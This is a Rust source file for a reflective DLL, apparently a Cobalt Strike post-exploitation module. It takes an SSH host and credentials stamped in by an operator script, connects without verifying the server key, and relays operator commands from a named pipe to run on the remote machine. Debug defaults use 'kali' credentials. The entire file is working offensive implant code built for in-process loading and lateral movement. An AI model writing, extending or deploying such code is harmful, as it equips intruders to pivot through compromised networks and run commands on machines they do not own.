#![no_main]
#![allow(dead_code)]
#![crate_type = "cdylib"]

mod ffi;
mod pipe;
mod windows;

use crate::pipe::*;

use std::os::raw::c_void;
use std::ptr::null_mut;
use windows::*;

use std::sync::Arc;
use std::thread;
use std::time::Duration;
use tokio::runtime::Runtime;
use russh::keys::*;
use russh::*;
use russh::client::{Config, Handle};
use tokio::main;
use windows_sys::Win32::Foundation::CloseHandle;
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject, INFINITE, LPTHREAD_START_ROUTINE};
// Keep this for pipe handle cleanup

// IPv4 ADDRESS IS STOMPED IN BY .CNA
#[cfg(not(debug_assertions))]
pub static SSH_IPV4_ADDRESS: &[u8; 20] = b"999.999.999.999\0\0\0\0\0";
#[cfg(not(debug_assertions))]
pub static USERNAME_STRING: &[u8; 66] = b"USERNAME_STRING_NO_CHANGE_PLS_USERNAME_STRING_NO_CHANGE_PLS_____\0\0";
#[cfg(not(debug_assertions))]
pub static PASSWORD_STRING: &[u8; 66] = b"PASSWORD_STRING_NO_CHANGE_PLS_PASSWORD_STRING_NO_CHANGE_PLS_____\0\0";

/// Debug config
#[cfg(debug_assertions)]
pub static SSH_IPV4_ADDRESS: &[u8; 20] = b"192.168.0.18\0\0\0\0\0\0\0\0";
#[cfg(debug_assertions)]
pub static USERNAME_STRING: &[u8; 66] = b"kali\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
#[cfg(debug_assertions)]
pub static PASSWORD_STRING: &[u8; 66] = b"kali\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";

pub static SSH_KEY: &[u8; 2050] = b"SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_CHANGE_PLS_SSH_KEY_STRING_NO_C\0";

const SSH_PORT: u16 = 22;

struct Client {}
impl client::Handler for Client {
    type Error = russh::Error;
    async fn check_server_key(
        &mut self,
        _server_public_key: &ssh_key::PublicKey,
    ) -> Result<bool, Self::Error> {
        Ok(true)
    } // ToDo
}

unsafe extern "system" fn dll_main_caller(_param: *mut c_void) -> u32{
    dll_main();
    0
}

/// Entry point for the custom Rust-based DLL.
///
/// This function serves as the main entry point for invoking functionality
/// via the Reflective DLL template. As examples, it performs the following operations:
///
/// 1. Outputs a message using a named pipe or standard output, depending on the build configuration.
#[unsafe(no_mangle)]
#[tokio::main(flavor = "current_thread")]
pub async fn dll_main()
{
    let h_output_pipe = match initialize_output_pipe() {
        None => {
            // Optionally log this error if you have a mechanism
            return;
        }
        Some(h) => h,
    };

    // Convert the IP address bytes to string
    let ip_address = String::from_utf8_lossy(SSH_IPV4_ADDRESS)
        .trim_end_matches(char::from(0))
        .to_string();
    let server_address = (ip_address.as_str(), SSH_PORT);

    // Get username, password, and SSH key from stomped-in values
    let username = String::from_utf8_lossy(USERNAME_STRING)
        .trim_end_matches(char::from(0))
        .to_string();
    let password = String::from_utf8_lossy(PASSWORD_STRING)
        .trim_end_matches(char::from(0))
        .to_string();
    let ssh_key_bytes = SSH_KEY
        .iter()
        .take_while(|&&b| b != 0)
        .cloned()
        .collect::<Vec<u8>>();

    // Set up SSH client configuration
    let config = Arc::new(Config {
        inactivity_timeout: Some(Duration::from_secs(60)), // Example timeout
        ..Default::default()
    });

    let sh = Client {};

    // Attempt to connect
    let mut session_handle: Handle<Client> = match client::connect(config, server_address, sh).await {
        Ok(session) => session,
        Err(e) => {
            write_output(h_output_pipe, &format!("SSH connection failed: {}\n", e));
            return;
        }
    };

    // Authenticate
    let auth_success = if password.is_empty() && !ssh_key_bytes.is_empty() {
        // Authenticate with private key
        match std::str::from_utf8(&ssh_key_bytes) {
            Ok(key_pem_str) => {
                match russh::keys::decode_secret_key(key_pem_str, None) {
                    Ok(key_pair) => {
                        match session_handle.authenticate_publickey(
                            &username,
                            russh::keys::PrivateKeyWithHashAlg::new(
                                Arc::new(key_pair),
                                session_handle.best_supported_rsa_hash().await.unwrap().unwrap(),
                            )
                        ).await {
                            Ok(auth_res) => auth_res,
                            Err(e) => {
                                write_output(h_output_pipe, &format!("SSH key authentication error: {}\n", e));
                                return;
                            }
                        }
                    }
                    Err(e) => {
                        write_output(h_output_pipe, &format!("Failed to load private key: {}\n", e));
                        return;
                    }
                }
            }
            Err(e) => {
                write_output(h_output_pipe, &format!("Private key is not valid UTF-8: {}\n", e));
                return;
            }
        }

    } else if !password.is_empty() {
        // Authenticate with password
        match session_handle.authenticate_password(&username, &password).await {
            Ok(auth_res) => auth_res,
            Err(e) => {
                write_output(h_output_pipe, &format!("SSH password authentication error: {}\n", e));
                return;
            }
        }
    } else {
        write_output(h_output_pipe, "No password or SSH key provided for authentication.\n");
        return;
    };

    if !auth_success.success() {
        write_output(h_output_pipe, &format!("Authentication failed for user {}.\n", username));
        let _ = session_handle.disconnect(Disconnect::ByApplication, "Auth failed", "en").await;
        return;
    }

    write_output(h_output_pipe, &format!("Authenticated user {}.\n", username));

    let h_input_pipe = match initialize_input_pipe() {
        None => {
            write_output(h_output_pipe, "Failed to initialize input pipe.\n");
            let _ = session_handle.disconnect(Disconnect::ByApplication, "Pipe init failed", "en").await;
            return;
        }
        Some(h) => h,
    };

    loop {
        let user_input = match read_input(h_input_pipe) {
            None => continue, // Or handle pipe error more gracefully
            Some(s) => s,
        };

        if user_input.trim().eq_ignore_ascii_case("exit") {
            write_output(h_output_pipe, &format!("Closing session to {}\n", ip_address));
            break;
        }

        let command: String = user_input.trim().chars().filter(|&c| c != '\0').collect();
        if command.is_empty() {
            continue;
        }

        match session_handle.channel_open_session().await {
            Ok(mut channel) => {
                if let Err(e) = channel.exec(true, command.as_str()).await {
                    write_output(h_output_pipe, &format!("Error executing command: {}\n", e));
                    continue;
                }

                let mut full_output = String::new();
                loop {
                    match channel.wait().await {
                        Some(ChannelMsg::Data { data }) => {
                            if let Ok(text) = String::from_utf8(data.to_vec()) {
                                full_output.push_str(&text);
                            }
                        }
                        Some(ChannelMsg::ExitStatus { exit_status }) => {
                            // Include the exit status in the output
                            full_output.push_str(&format!("\nExit status: {}", exit_status));
                            write_output(h_output_pipe, &full_output);
                            full_output.clear(); // Prepare for next potential output block or break
                            break; // Command finished
                        }
                        Some(ChannelMsg::Eof) => {
                            // End of data for this channel
                            if !full_output.is_empty() {
                                write_output(h_output_pipe, &full_output);
                                full_output.clear();
                            }
                            break;
                        }
                        None => { // Channel closed or error
                            if !full_output.is_empty() {
                                write_output(h_output_pipe, &full_output);
                            }
                            break;
                        }
                        _ => {} // Ignore other messages like ExtendedData, WindowAdjust, etc. for simple exec
                    }
                }
                // Ensure channel is closed if not already
                let _ = channel.close().await;
            }
            Err(e) => {
                write_output(h_output_pipe, &format!("Error opening channel: {}\n", e));
            }
        }
    }

    // Disconnect the SSH session
    if let Err(e) = session_handle.disconnect(Disconnect::ByApplication, "User exited", "en").await {
        write_output(h_output_pipe, &format!("Error during disconnect: {}\n", e));
    }

    // Clean up pipe handles (input pipe handle needs to be in scope here or passed)
    unsafe {
        if h_input_pipe != std::ptr::null_mut() && h_input_pipe != INVALID_HANDLE_VALUE { // Assuming INVALID_HANDLE_VALUE is -1 or 0
            CloseHandle(h_input_pipe);
        }
        if h_output_pipe != std::ptr::null_mut() && h_output_pipe != INVALID_HANDLE_VALUE {
            CloseHandle(h_output_pipe);
        }
    }
}

#[unsafe(no_mangle)]
pub unsafe extern "system" fn dll_start(){
    // Create a new thread with its own tokio runtime
    unsafe {
        let h_thread = CreateThread(null_mut(), 0, Some(dll_main_caller), null_mut(), 0, null_mut() );
        WaitForSingleObject(h_thread, INFINITE);
    }
}

#[unsafe(no_mangle)]
#[allow(named_asm_labels)]
#[allow(non_snake_case, unused_variables, unreachable_patterns)]
pub unsafe extern "system" fn DllMain(
    dll_module: HANDLE,
    call_reason: u32,
    reserved: *mut c_void,
) -> BOOL {
    match call_reason {
        DLL_PROCESS_ATTACH => {

            // Initialize resources, etc.
            unsafe { dll_start() };

        }
        DLL_THREAD_ATTACH => {
            // Code to run when a new thread is created in the process
        }
        DLL_THREAD_DETACH => {
            // Code to run when a thread exits cleanly
        }
        DLL_PROCESS_DETACH => {
            // Code to run when the DLL is unloaded from the process
            // Clean up resources, etc.
        }
        _ => {}
    }
    return 1;
}
